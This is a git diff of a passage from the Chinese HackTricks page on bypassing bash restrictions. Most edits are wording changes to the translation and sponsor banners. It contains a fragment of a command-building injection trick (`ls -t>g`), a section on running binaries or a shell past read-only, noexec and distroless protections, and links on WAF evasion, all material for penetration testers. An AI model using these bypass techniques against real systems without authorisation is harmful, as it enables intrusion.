 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -661,7 +630,7 @@ ln /f*
 ```
 ## 只读/Noexec/Distroless绕过
 
-如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！:**
+如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
@@ -680,7 +649,7 @@ ln /f*
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
@@ -692,10 +661,10 @@ ln /f*
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**最新版本的PEASS或下载PDF格式的HackTricks**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
